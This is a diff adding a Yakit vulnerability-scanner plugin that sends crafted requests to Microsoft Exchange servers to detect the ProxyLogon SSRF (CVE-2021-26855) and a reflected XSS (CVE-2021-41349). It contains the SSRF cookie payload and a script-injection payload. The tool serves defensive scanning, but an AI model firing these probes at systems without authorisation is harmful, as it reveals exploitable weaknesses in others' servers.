@@ -1,0 +1,116 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+
+
+
+PacketPoc1 = `GET {{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+PacketPoc2 = `POST /autodiscover/autodiscover.json HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip
+Content-Length: 192
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+{{params(payload)}}`
+
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+
+//填充对应的漏洞检测规则
+addRule(PacketPoc1,`/owa/auth/x.js`,func(rsp,header,body){
+    if str.MatchAllOfSubString(header, `X-CalculatedBETarget`, `localhost`) {
+        return true
+    }
+    return false
+},"SSRF","exchange-cve-2021-26855","high","https://github.com/microsoft/CSS-Exchange/blob/main/Security/http-vuln-cve2021-26855.nse")
+
+addRule(PacketPoc2,`<script>alert(1);+"=</script>`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `<script>alert(1)`) {
+        return true
+    }
+    return false
+},"XSS","exchange-cve-2021-41349","low","https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2021-41349")
+
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+
+    // 漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
